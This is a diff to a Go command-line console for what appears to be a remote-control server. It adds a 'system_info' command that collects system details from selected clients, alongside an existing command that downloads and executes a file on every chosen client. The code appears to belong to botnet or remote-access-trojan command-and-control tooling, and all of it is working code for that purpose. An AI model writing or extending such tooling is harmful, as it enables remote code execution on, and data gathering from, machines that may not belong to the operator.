@@ -6,6 +6,7 @@ import (
 	"time"
 
 	"apollo/server/client"
+
 	"github.com/logrusorgru/aurora"
 )
 
@@ -150,12 +151,33 @@ var commandList = []command{
 				return c.au.Red(err).String()
 			}
 			for _, cl := range clients {
-				
+
 				err := cl.DownloadAndExecute(args[1], args[2:])
 				if err != nil {
 					c.Printf(c.au.Red(fmt.Sprintf("Error downloading and executing on %s: %s", cl, err)).String())
 				}
 				c.Printf("Downloaded and executed on client ID %d", cl.ID)
+			}
+			return ""
+		},
+	},
+	{
+		Name:    "system_info",
+		Aliases: []string{"sysinfo"},
+		MinArgs: 1,
+		Help:    "View system info of a client or list of clients",
+		Usage:   "system_info (client)",
+		Function: func(c Cli, args []string) string {
+			clients, err := getClientsFromCapture(args[0])
+			if err != nil {
+				return c.au.Red(err).String()
+			}
+			for _, cl := range clients {
+				info, err := cl.GetSystemInfo()
+				if err != nil {
+					c.Printf(c.au.Red(fmt.Sprintf("Error getting system info on %s: %s", cl, err)).String())
+				}
+				c.Printf("Client ID %d: %s\n", cl.ID, info.String())
 			}
 			return ""
 		},
